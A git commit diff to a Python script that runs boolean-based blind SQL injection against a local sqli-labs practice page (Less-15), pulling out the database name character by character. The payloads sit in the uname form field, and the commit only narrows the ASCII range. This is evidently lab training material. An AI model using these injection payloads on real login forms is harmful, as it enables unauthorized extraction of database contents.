a621bb75a5b0a0aead1a3a0a27d98d24a7818e5d
xuoneyuan <90903872+xuoneyuan@users.noreply.github.com>
2023-04-09 11:06:59 +0800

    Update bool_post.py

--- bool_post.py
+++ bool_post.py
@@ -3,7 +3,7 @@ import requests
 url="http://127.0.0.1/sqli-labs-master/Less-15/"
 result=""
 for i in range(1,10):
-    for j in range(65,150):
+    for j in range(65,127):
         payload1="0'^(ascii(substr(database(),{},1))>{})^1#".format(i,j)
         payload2="admin'^(ascii(mid(database(),{},1))>{})^1%23".format(i,j)
         data={"uname":payload1,"passwd":"123"}
